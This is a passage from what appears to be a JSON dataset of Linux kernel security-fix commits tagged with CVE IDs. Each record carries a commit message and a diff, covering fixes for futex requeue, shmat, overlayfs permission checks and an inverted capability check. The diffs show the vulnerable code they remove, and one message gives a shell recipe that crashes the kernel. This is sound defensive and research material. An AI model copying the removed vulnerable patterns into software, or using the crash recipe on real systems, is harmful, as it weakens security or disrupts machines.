<paul.burton@imgtec.com>\nReviewed-by: James Hogan <james.hogan@imgtec.com>\nCc: linux-mips@linux-mips.org\nPatchwork: https:\/\/patchwork.linux-mips.org\/patch\/6405\/\nSigned-off-by: Ralf Baechle <ralf@linux-mips.org>\n---\n arch\/mips\/include\/asm\/thread_info.h | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/mips\/include\/asm\/thread_info.h b\/arch\/mips\/include\/asm\/thread_info.h\nindex 24846f9053fe..e80ae50cae80 100644\n--- a\/arch\/mips\/include\/asm\/thread_info.h\n+++ b\/arch\/mips\/include\/asm\/thread_info.h\n@@ -136,7 +136,8 @@ static inline struct thread_info *current_thread_info(void)\n #define _TIF_SYSCALL_TRACEPOINT\t(1<<TIF_SYSCALL_TRACEPOINT)\n \n #define _TIF_WORK_SYSCALL_ENTRY\t(_TIF_NOHZ | _TIF_SYSCALL_TRACE |\t\\\n-\t\t\t\t _TIF_SYSCALL_AUDIT | _TIF_SYSCALL_TRACEPOINT)\n+\t\t\t\t _TIF_SYSCALL_AUDIT | \\\n+\t\t\t\t _TIF_SYSCALL_TRACEPOINT | _TIF_SECCOMP)\n \n \/* work to do in syscall_trace_leave() *\/\n #define _TIF_WORK_SYSCALL_EXIT\t(_TIF_NOHZ | _TIF_SYSCALL_TRACE |\t\\\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-5669","CWE_ID":"264","category":"security","commit_id":"e1d35d4dc7f089e6c9c080d556feedf9c706f0c7","commit_message":"From e1d35d4dc7f089e6c9c080d556feedf9c706f0c7 Mon Sep 17 00:00:00 2001\nFrom: Davidlohr Bueso <dave@stgolabs.net>\nDate: Wed, 8 Feb 2017 10:28:24 +1100\nSubject: [PATCH] ipc\/shm: Fix shmat mmap nil-page protection\n\nThe issue is described here, with a nice testcase:\n\n    https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=192931\n\nThe problem is that shmat() calls do_mmap_pgoff() with MAP_FIXED, and the\naddress rounded down to 0.  For the regular mmap case, the protection\nmentioned above is that the kernel gets to generate the address --\narch_get_unmapped_area() will always check for MAP_FIXED and return that\naddress.  So by the time we do security_mmap_addr(0) things get funky for\nshmat().\n\nThe testcase itself shows that while a regular user crashes, root will not\nhave a problem attaching a nil-page.  There are two possible fixes to\nthis.  The first, and which this patch does, is to simply allow root to\ncrash as well -- this is also regular mmap behavior, ie when hacking up\nthe testcase and adding mmap(...  |MAP_FIXED).  While this approach is the\nsafer option, the second alternative is to ignore SHM_RND if the rounded\naddress is 0, thus only having MAP_SHARED flags.  This makes the behavior\nof shmat() identical to the mmap() case.  The downside of this is\nobviously user visible, but does make sense in that it maintains semantics\nafter the round-down wrt 0 address and mmap.\n\nPasses shm related ltp tests.\n\nLink: http:\/\/lkml.kernel.org\/r\/1486050195-18629-1-git-send-email-dave@stgolabs.net\nSigned-off-by: Davidlohr Bueso <dbueso@suse.de>\nReported-by: Gareth Evans <gareth.evans@contextis.co.uk>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: Michael Kerrisk <mtk.manpages@googlemail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\n---\n ipc\/shm.c | 13 +++++++++----\n 1 file changed, 9 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/ipc\/shm.c b\/ipc\/shm.c\nindex d7805acb44fd4..06ea9ef7f54a7 100644\n--- a\/ipc\/shm.c\n+++ b\/ipc\/shm.c\n@@ -1091,8 +1091,8 @@ SYSCALL_DEFINE3(shmctl, int, shmid, int, cmd, struct shmid_ds __user *, buf)\n  * \"raddr\" thing points to kernel space, and there has to be a wrapper around\n  * this.\n  *\/\n-long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr,\n-\t      unsigned long shmlba)\n+long do_shmat(int shmid, char __user *shmaddr, int shmflg,\n+\t      ulong *raddr, unsigned long shmlba)\n {\n \tstruct shmid_kernel *shp;\n \tunsigned long addr;\n@@ -1113,8 +1113,13 @@ long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr,\n \t\tgoto out;\n \telse if ((addr = (ulong)shmaddr)) {\n \t\tif (addr & (shmlba - 1)) {\n-\t\t\tif (shmflg & SHM_RND)\n-\t\t\t\taddr &= ~(shmlba - 1);\t   \/* round down *\/\n+\t\t\t\/*\n+\t\t\t * Round down to the nearest multiple of shmlba.\n+\t\t\t * For sane do_mmap_pgoff() parameters, avoid\n+\t\t\t * round downs that trigger nil-page and MAP_FIXED.\n+\t\t\t *\/\n+\t\t\tif ((shmflg & SHM_RND) && addr >= shmlba)\n+\t\t\t\taddr &= ~(shmlba - 1);\n \t\t\telse\n #ifndef __ARCH_FORCE_SHMLBA\n \t\t\t\tif (addr & ~PAGE_MASK)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3153","CWE_ID":"264","category":"security","commit_id":"e9c243a5a6de0be8e584c604d353412584b592f8","commit_message":"From e9c243a5a6de0be8e584c604d353412584b592f8 Mon Sep 17 00:00:00 2001\nFrom: Thomas Gleixner <tglx@linutronix.de>\nDate: Tue, 3 Jun 2014 12:27:06 +0000\nSubject: [PATCH] futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid\n uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from\na non-pi futex to a pi futex with this call.  If we attempt this, then\ndangling pointers may be left for rt_waiter resulting in an exploitable\ncondition.\n\nThis change brings futex_requeue() in line with futex_wait_requeue_pi()\nwhich performs the same check as per commit 6f7b0a2a5c0f (\"futex: Forbid\nuaddr == uaddr2 in futex_wait_requeue_pi()\")\n\n[ tglx: Compare the resulting keys as well, as uaddrs might be\n  \tdifferent depending on the mapping ]\n\nFixes CVE-2014-3153.\n\nReported-by: Pinkie Pie\nSigned-off-by: Will Drewry <wad@chromium.org>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nReviewed-by: Darren Hart <dvhart@linux.intel.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/futex.c | 25 +++++++++++++++++++++++++\n 1 file changed, 25 insertions(+)\n\n","diff_code":"diff --git a\/kernel\/futex.c b\/kernel\/futex.c\nindex 81dbe773ce4c2..663ea2b84a383 100644\n--- a\/kernel\/futex.c\n+++ b\/kernel\/futex.c\n@@ -1441,6 +1441,13 @@ static int futex_requeue(u32 __user *uaddr1, unsigned int flags,\n \tstruct futex_q *this, *next;\n \n \tif (requeue_pi) {\n+\t\t\/*\n+\t\t * Requeue PI only works on two distinct uaddrs. This\n+\t\t * check is only valid for private futexes. See below.\n+\t\t *\/\n+\t\tif (uaddr1 == uaddr2)\n+\t\t\treturn -EINVAL;\n+\n \t\t\/*\n \t\t * requeue_pi requires a pi_state, try to allocate it now\n \t\t * without any locks in case it fails.\n@@ -1479,6 +1486,15 @@ static int futex_requeue(u32 __user *uaddr1, unsigned int flags,\n \tif (unlikely(ret != 0))\n \t\tgoto out_put_key1;\n \n+\t\/*\n+\t * The check above which compares uaddrs is not sufficient for\n+\t * shared futexes. We need to compare the keys:\n+\t *\/\n+\tif (requeue_pi && match_futex(&key1, &key2)) {\n+\t\tret = -EINVAL;\n+\t\tgoto out_put_keys;\n+\t}\n+\n \thb1 = hash_futex(&key1);\n \thb2 = hash_futex(&key2);\n \n@@ -2525,6 +2541,15 @@ static int futex_wait_requeue_pi(u32 __user *uaddr, unsigned int flags,\n \tif (ret)\n \t\tgoto out_key2;\n \n+\t\/*\n+\t * The check above which compares uaddrs is not sufficient for\n+\t * shared futexes. We need to compare the keys:\n+\t *\/\n+\tif (match_futex(&q.key, &key2)) {\n+\t\tret = -EINVAL;\n+\t\tgoto out_put_keys;\n+\t}\n+\n \t\/* Queue the futex_q, drop the hb lock, wait for wakeup. *\/\n \tfutex_wait_queue_me(hb, &q, to);\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-6657","CWE_ID":"264","category":"security","commit_id":"3e10986d1d698140747fcfc2761ec9cb64c1d582","commit_message":"From 3e10986d1d698140747fcfc2761ec9cb64c1d582 Mon Sep 17 00:00:00 2001\nFrom: Eric Dumazet <edumazet@google.com>\nDate: Mon, 24 Sep 2012 07:00:11 +0000\nSubject: net: guard tcp_set_keepalive() to tcp sockets\n\nIts possible to use RAW sockets to get a crash in\ntcp_set_keepalive() \/ sk_reset_timer()\n\nFix is to make sure socket is a SOCK_STREAM one.\n\nReported-by: Dave Jones <davej@redhat.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/sock.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/core\/sock.c b\/net\/core\/sock.c\nindex 305792076121..a6000fbad294 100644\n--- a\/net\/core\/sock.c\n+++ b\/net\/core\/sock.c\n@@ -691,7 +691,8 @@ set_rcvbuf:\n \n \tcase SO_KEEPALIVE:\n #ifdef CONFIG_INET\n-\t\tif (sk->sk_protocol == IPPROTO_TCP)\n+\t\tif (sk->sk_protocol == IPPROTO_TCP &&\n+\t\t    sk->sk_type == SOCK_STREAM)\n \t\t\ttcp_set_keepalive(sk, valbool);\n #endif\n \t\tsock_valbool_flag(sk, SOCK_KEEPOPEN, valbool);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-1575","CWE_ID":"264","category":"security","commit_id":"8d3095f4ad47ac409440a0ba1c80e13519ff867d","commit_message":"From 8d3095f4ad47ac409440a0ba1c80e13519ff867d Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Mon, 12 Oct 2015 17:11:44 +0200\nSubject: ovl: default permissions\n\nAdd mount option \"default_permissions\" to alter the way permissions are\ncalculated.\n\nWithout this option and prior to this patch permissions were calculated by\nunderlying lower or upper filesystem.\n\nWith this option the permissions are calculated by overlayfs based on the\nfile owner, group and mode bits.\n\nThis has significance for example when a read-only exported NFS filesystem\nis used as a lower layer.  In this case the underlying NFS filesystem will\nreply with EROFS, in which case all we know is that the filesystem is\nread-only.  But that's not what we are interested in, we are interested in\nwhether the access would be allowed if the filesystem wasn't read-only; the\nserver doesn't tell us that, and would need updating at various levels,\nwhich doesn't seem practicable.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\n---\n fs\/overlayfs\/inode.c     | 23 +++++++++++++++++++++++\n fs\/overlayfs\/overlayfs.h |  3 +++\n fs\/overlayfs\/super.c     | 28 ++++++++++++++++++++++++++++\n 3 files changed, 54 insertions(+)\n\nFrom 97daf8b97ad6f913a34c82515be64dc9ac08d63e Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Tue, 10 Nov 2015 17:08:41 +0100\nSubject: ovl: allow zero size xattr\n\nWhen ovl_copy_xattr() encountered a zero size xattr no more xattrs were\ncopied and the function returned success.  This is clearly not the desired\nbehavior.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/copy_up.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\nFrom e4ad29fa0d224d05e08b2858e65f112fd8edd4fe Mon Sep 17 00:00:00 2001\nFrom: Vito Caputo <vito.caputo@coreos.com>\nDate: Sat, 24 Oct 2015 07:19:46 -0500\nSubject: ovl: use a minimal buffer in ovl_copy_xattr\n\nRather than always allocating the high-order XATTR_SIZE_MAX buffer\nwhich is costly and prone to failure, only allocate what is needed and\nrealloc if necessary.\n\nFixes https:\/\/github.com\/coreos\/bugs\/issues\/489\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/copy_up.c | 39 +++++++++++++++++++++++++--------------\n 1 file changed, 25 insertions(+), 14 deletions(-)\n\nFrom 257f871993474e2bde6c497b54022c362cf398e1 Mon Sep 17 00:00:00 2001\nFrom: Stephen Hemminger <stephen@networkplumber.org>\nDate: Wed, 4 Nov 2015 10:59:52 -0800\nSubject: ovl: move super block magic number to magic.h\n\nThe overlayfs file system is not recognized by programs\nlike tail because the magic number is not in standard header location.\n\nMove it so that the value will propagate on for the GNU library\nand utilities. Needs to go in the fstatfs manual page as well.\n\nSigned-off-by: Stephen Hemminger <stephen@networkplumber.org>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\n---\n fs\/overlayfs\/super.c       | 2 --\n include\/uapi\/linux\/magic.h | 1 +\n 2 files changed, 1 insertion(+), 2 deletions(-)\n\nFrom ed06e069775ad9236087594a1c1667367e983fb5 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Wed, 9 Dec 2015 16:11:59 +0100\nSubject: ovl: root: copy attr\n\nWe copy i_uid and i_gid of underlying inode into overlayfs inode.  Except\nfor the root inode.\n\nFix this omission.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/super.c | 3 +++\n 1 file changed, 3 insertions(+)\n\nFrom cf9a6784f7c1b5ee2b9159a1246e327c331c5697 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Fri, 11 Dec 2015 16:30:49 +0100\nSubject: ovl: setattr: check permissions before copy-up\n\nWithout this copy-up of a file can be forced, even without actually being\nallowed to do anything on the file.\n\n[Arnd Bergmann] include <linux\/pagemap.h> for PAGE_CACHE_SIZE (used by\nMAX_LFS_FILESIZE definition).\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/inode.c | 13 +++++++++++++\n fs\/overlayfs\/super.c |  2 ++\n 2 files changed, 15 insertions(+)\n\nFrom 84889d49335627bc770b32787c1ef9ebad1da232 Mon Sep 17 00:00:00 2001\nFrom: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nDate: Mon, 16 Nov 2015 18:44:11 +0300\nSubject: ovl: check dentry positiveness in ovl_cleanup_whiteouts()\n\nThis patch fixes kernel crash at removing directory which contains\nwhiteouts from lower layers.\n\nCache of directory content passed as \"list\" contains entries from all\nlayers, including whiteouts from lower layers. So, lookup in upper dir\n(moved into work at this stage) will return negative entry. Plus this\ncache is filled long before and we can race with external removal.\n\nExample:\n mkdir -p lower0\/dir lower1\/dir upper work overlay\n touch lower0\/dir\/a lower0\/dir\/b\n mknod lower1\/dir\/a c 0 0\n mount -t overlay none overlay -o lowerdir=lower1:lower0,upperdir=upper,workdir=work\n rm -fr overlay\/dir\n\nSigned-off-by: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org> # 3.18+\n---\n fs\/overlayfs\/readdir.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex ec0c2a050043..76546314e35f 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -98,6 +98,29 @@ int ovl_permission(struct inode *inode, int mask)\n \n \trealdentry = ovl_entry_real(oe, &is_upper);\n \n+\tif (ovl_is_default_permissions(inode)) {\n+\t\tstruct kstat stat;\n+\t\tstruct path realpath = { .dentry = realdentry };\n+\n+\t\tif (mask & MAY_NOT_BLOCK)\n+\t\t\treturn -ECHILD;\n+\n+\t\trealpath.mnt = ovl_entry_mnt_real(oe, inode, is_upper);\n+\n+\t\terr = vfs_getattr(&realpath, &stat);\n+\t\tif (err)\n+\t\t\treturn err;\n+\n+\t\tif ((stat.mode ^ inode->i_mode) & S_IFMT)\n+\t\t\treturn -ESTALE;\n+\n+\t\tinode->i_mode = stat.mode;\n+\t\tinode->i_uid = stat.uid;\n+\t\tinode->i_gid = stat.gid;\n+\n+\t\treturn generic_permission(inode, mask);\n+\t}\n+\n \t\/* Careful in RCU walk mode *\/\n \trealinode = ACCESS_ONCE(realdentry->d_inode);\n \tif (!realinode) {\ndiff --git a\/fs\/overlayfs\/overlayfs.h b\/fs\/overlayfs\/overlayfs.h\nindex ea5a40b06e3a..f3e6efefe40b 100644\n--- a\/fs\/overlayfs\/overlayfs.h\n+++ b\/fs\/overlayfs\/overlayfs.h\n@@ -142,7 +142,10 @@ struct dentry *ovl_dentry_upper(struct dentry *dentry);\n struct dentry *ovl_dentry_lower(struct dentry *dentry);\n struct dentry *ovl_dentry_real(struct dentry *dentry);\n struct dentry *ovl_entry_real(struct ovl_entry *oe, bool *is_upper);\n+struct vfsmount *ovl_entry_mnt_real(struct ovl_entry *oe, struct inode *inode,\n+\t\t\t\t    bool is_upper);\n struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry);\n+bool ovl_is_default_permissions(struct inode *inode);\n void ovl_set_dir_cache(struct dentry *dentry, struct ovl_dir_cache *cache);\n struct dentry *ovl_workdir(struct dentry *dentry);\n int ovl_want_write(struct dentry *dentry);\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 8d04b86e0680..97cacb525974 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -30,6 +30,7 @@ struct ovl_config {\n \tchar *lowerdir;\n \tchar *upperdir;\n \tchar *workdir;\n+\tbool default_permissions;\n };\n \n \/* private information held for overlayfs's superblock *\/\n@@ -154,6 +155,18 @@ struct dentry *ovl_entry_real(struct ovl_entry *oe, bool *is_upper)\n \treturn realdentry;\n }\n \n+struct vfsmount *ovl_entry_mnt_real(struct ovl_entry *oe, struct inode *inode,\n+\t\t\t\t    bool is_upper)\n+{\n+\tif (is_upper) {\n+\t\tstruct ovl_fs *ofs = inode->i_sb->s_fs_info;\n+\n+\t\treturn ofs->upper_mnt;\n+\t} else {\n+\t\treturn oe->numlower ? oe->lowerstack[0].mnt : NULL;\n+\t}\n+}\n+\n struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry)\n {\n \tstruct ovl_entry *oe = dentry->d_fsdata;\n@@ -161,6 +174,13 @@ struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry)\n \treturn oe->cache;\n }\n \n+bool ovl_is_default_permissions(struct inode *inode)\n+{\n+\tstruct ovl_fs *ofs = inode->i_sb->s_fs_info;\n+\n+\treturn ofs->config.default_permissions;\n+}\n+\n void ovl_set_dir_cache(struct dentry *dentry, struct ovl_dir_cache *cache)\n {\n \tstruct ovl_entry *oe = dentry->d_fsdata;\n@@ -594,6 +614,8 @@ static int ovl_show_options(struct seq_file *m, struct dentry *dentry)\n \t\tseq_printf(m, \",upperdir=%s\", ufs->config.upperdir);\n \t\tseq_printf(m, \",workdir=%s\", ufs->config.workdir);\n \t}\n+\tif (ufs->config.default_permissions)\n+\t\tseq_puts(m, \",default_permissions\");\n \treturn 0;\n }\n \n@@ -618,6 +640,7 @@ enum {\n \tOPT_LOWERDIR,\n \tOPT_UPPERDIR,\n \tOPT_WORKDIR,\n+\tOPT_DEFAULT_PERMISSIONS,\n \tOPT_ERR,\n };\n \n@@ -625,6 +648,7 @@ static const match_table_t ovl_tokens = {\n \t{OPT_LOWERDIR,\t\t\t\"lowerdir=%s\"},\n \t{OPT_UPPERDIR,\t\t\t\"upperdir=%s\"},\n \t{OPT_WORKDIR,\t\t\t\"workdir=%s\"},\n+\t{OPT_DEFAULT_PERMISSIONS,\t\"default_permissions\"},\n \t{OPT_ERR,\t\t\tNULL}\n };\n \n@@ -685,6 +709,10 @@ static int ovl_parse_opt(char *opt, struct ovl_config *config)\n \t\t\t\treturn -ENOMEM;\n \t\t\tbreak;\n \n+\t\tcase OPT_DEFAULT_PERMISSIONS:\n+\t\t\tconfig->default_permissions = true;\n+\t\t\tbreak;\n+\n \t\tdefault:\n \t\t\tpr_err(\"overlayfs: unrecognized mount option \\\"%s\\\" or missing value\\n\", p);\n \t\t\treturn -EINVAL;\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/copy_up.c b\/fs\/overlayfs\/copy_up.c\nindex 871fcb67be97..394e87f8340f 100644\n--- a\/fs\/overlayfs\/copy_up.c\n+++ b\/fs\/overlayfs\/copy_up.c\n@@ -54,7 +54,7 @@ int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n \n \tfor (name = buf; name < (buf + list_size); name += strlen(name) + 1) {\n \t\tsize = vfs_getxattr(old, name, value, XATTR_SIZE_MAX);\n-\t\tif (size <= 0) {\n+\t\tif (size < 0) {\n \t\t\terror = size;\n \t\t\tgoto out_free_value;\n \t\t}\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/copy_up.c b\/fs\/overlayfs\/copy_up.c\nindex 394e87f8340f..758012bfd5f0 100644\n--- a\/fs\/overlayfs\/copy_up.c\n+++ b\/fs\/overlayfs\/copy_up.c\n@@ -22,9 +22,9 @@\n \n int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n {\n-\tssize_t list_size, size;\n-\tchar *buf, *name, *value;\n-\tint error;\n+\tssize_t list_size, size, value_size = 0;\n+\tchar *buf, *name, *value = NULL;\n+\tint uninitialized_var(error);\n \n \tif (!old->d_inode->i_op->getxattr ||\n \t    !new->d_inode->i_op->getxattr)\n@@ -41,29 +41,40 @@ int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n \tif (!buf)\n \t\treturn -ENOMEM;\n \n-\terror = -ENOMEM;\n-\tvalue = kmalloc(XATTR_SIZE_MAX, GFP_KERNEL);\n-\tif (!value)\n-\t\tgoto out;\n-\n \tlist_size = vfs_listxattr(old, buf, list_size);\n \tif (list_size <= 0) {\n \t\terror = list_size;\n-\t\tgoto out_free_value;\n+\t\tgoto out;\n \t}\n \n \tfor (name = buf; name < (buf + list_size); name += strlen(name) + 1) {\n-\t\tsize = vfs_getxattr(old, name, value, XATTR_SIZE_MAX);\n+retry:\n+\t\tsize = vfs_getxattr(old, name, value, value_size);\n+\t\tif (size == -ERANGE)\n+\t\t\tsize = vfs_getxattr(old, name, NULL, 0);\n+\n \t\tif (size < 0) {\n \t\t\terror = size;\n-\t\t\tgoto out_free_value;\n+\t\t\tbreak;\n+\t\t}\n+\n+\t\tif (size > value_size) {\n+\t\t\tvoid *new;\n+\n+\t\t\tnew = krealloc(value, size, GFP_KERNEL);\n+\t\t\tif (!new) {\n+\t\t\t\terror = -ENOMEM;\n+\t\t\t\tbreak;\n+\t\t\t}\n+\t\t\tvalue = new;\n+\t\t\tvalue_size = size;\n+\t\t\tgoto retry;\n \t\t}\n+\n \t\terror = vfs_setxattr(new, name, value, size, 0);\n \t\tif (error)\n-\t\t\tgoto out_free_value;\n+\t\t\tbreak;\n \t}\n-\n-out_free_value:\n \tkfree(value);\n out:\n \tkfree(buf);\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 97cacb525974..32f31243d36a 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -24,8 +24,6 @@ MODULE_AUTHOR(\"Miklos Szeredi <miklos@szeredi.hu>\");\n MODULE_DESCRIPTION(\"Overlay filesystem\");\n MODULE_LICENSE(\"GPL\");\n \n-#define OVERLAYFS_SUPER_MAGIC 0x794c7630\n-\n struct ovl_config {\n \tchar *lowerdir;\n \tchar *upperdir;\ndiff --git a\/include\/uapi\/linux\/magic.h b\/include\/uapi\/linux\/magic.h\nindex 7b1425a6b370..eec438952aa7 100644\n--- a\/include\/uapi\/linux\/magic.h\n+++ b\/include\/uapi\/linux\/magic.h\n@@ -31,6 +31,7 @@\n #define PSTOREFS_MAGIC\t\t0x6165676C\n #define EFIVARFS_MAGIC\t\t0xde5e81e4\n #define HOSTFS_SUPER_MAGIC\t0x00c0ffee\n+#define OVERLAYFS_SUPER_MAGIC\t0x794c7630\n \n #define MINIX_SUPER_MAGIC\t0x137F\t\t\/* minix v1 fs, 14 char names *\/\n #define MINIX_SUPER_MAGIC2\t0x138F\t\t\/* minix v1 fs, 30 char names *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 32f31243d36a..ec31711d4886 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -1079,6 +1079,9 @@ static int ovl_fill_super(struct super_block *sb, void *data, int silent)\n \n \troot_dentry->d_fsdata = oe;\n \n+\tovl_copyattr(ovl_dentry_real(root_dentry)->d_inode,\n+\t\t     root_dentry->d_inode);\n+\n \tsb->s_magic = OVERLAYFS_SUPER_MAGIC;\n \tsb->s_op = &ovl_super_operations;\n \tsb->s_root = root_dentry;\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex 76546314e35f..213a726cff96 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -45,6 +45,19 @@ int ovl_setattr(struct dentry *dentry, struct iattr *attr)\n \tint err;\n \tstruct dentry *upperdentry;\n \n+\t\/*\n+\t * Check for permissions before trying to copy-up.  This is redundant\n+\t * since it will be rechecked later by ->setattr() on upper dentry.  But\n+\t * without this, copy-up can be triggered by just about anybody.\n+\t *\n+\t * We don't initialize inode->size, which just means that\n+\t * inode_newsize_ok() will always check against MAX_LFS_FILESIZE and not\n+\t * check for a swapfile (which this won't be anyway).\n+\t *\/\n+\terr = inode_change_ok(dentry->d_inode, attr);\n+\tif (err)\n+\t\treturn err;\n+\n \terr = ovl_want_write(dentry);\n \tif (err)\n \t\tgoto out;\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex ec31711d4886..b08bf4d3a405 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -9,6 +9,7 @@\n \n #include <linux\/fs.h>\n #include <linux\/namei.h>\n+#include <linux\/pagemap.h>\n #include <linux\/xattr.h>\n #include <linux\/security.h>\n #include <linux\/mount.h>\n@@ -936,6 +937,7 @@ static int ovl_fill_super(struct super_block *sb, void *data, int silent)\n \t}\n \n \tsb->s_stack_depth = 0;\n+\tsb->s_maxbytes = MAX_LFS_FILESIZE;\n \tif (ufs->config.upperdir) {\n \t\tif (!ufs->config.workdir) {\n \t\t\tpr_err(\"overlayfs: missing 'workdir'\\n\");\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/readdir.c b\/fs\/overlayfs\/readdir.c\nindex 70e9af551600..adcb1398c481 100644\n--- a\/fs\/overlayfs\/readdir.c\n+++ b\/fs\/overlayfs\/readdir.c\n@@ -571,7 +571,8 @@ void ovl_cleanup_whiteouts(struct dentry *upper, struct list_head *list)\n \t\t\t       (int) PTR_ERR(dentry));\n \t\t\tcontinue;\n \t\t}\n-\t\tovl_cleanup(upper->d_inode, dentry);\n+\t\tif (dentry->d_inode)\n+\t\t\tovl_cleanup(upper->d_inode, dentry);\n \t\tdput(dentry);\n \t}\n \tmutex_unlock(&upper->d_inode->i_mutex);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-0675","CWE_ID":"264","category":"security","commit_id":"c25b9abbc2c2c0da88e180c3933d6e773245815a","commit_message":"From c25b9abbc2c2c0da88e180c3933d6e773245815a Mon Sep 17 00:00:00 2001\nFrom: Roel Kluin <roel.kluin@gmail.com>\nDate: Thu, 29 Jan 2009 17:32:20 -0800\nSubject: drivers\/net\/skfp: if !capable(CAP_NET_ADMIN): inverted logic\n\nFix inverted logic\n\nSigned-off-by: Roel Kluin <roel.kluin@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers\/net\/skfp\/skfddi.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/net\/skfp\/skfddi.c b\/drivers\/net\/skfp\/skfddi.c\nindex 607efeaf0bc5..9a00e5566af7 100644\n--- a\/drivers\/net\/skfp\/skfddi.c\n+++ b\/drivers\/net\/skfp\/skfddi.c\n@@ -1003,9 +1003,9 @@ static int skfp_ioctl(struct net_device *dev, struct ifreq *rq, int cmd)\n \t\tbreak;\n \tcase SKFP_CLR_STATS:\t\/* Zero out the driver statistics *\/\n \t\tif (!capable(CAP_NET_ADMIN)) {\n-\t\t\tmemset(&lp->MacStat, 0, sizeof(lp->MacStat));\n-\t\t} else {\n \t\t\tstatus = -EPERM;\n+\t\t} else {\n+\t\t\tmemset(&lp->MacStat, 0, sizeof(lp->MacStat));\n \t\t}\n \t\tbreak;\n \tdefault:\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-1438","CWE_ID":"264","category":"security","commit_id":"26bef1318adc1b3a530ecc807ef99346db2aa8b0","commit_message":"From 26bef1318adc1b3a530ecc807ef99346db2aa8b0 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Sat, 11 Jan 2014 19:15:52 -0800\nSubject: [PATCH] x86, fpu, amd: Clear exceptions in AMD FXSAVE workaround\n\nBefore we do an EMMS in the 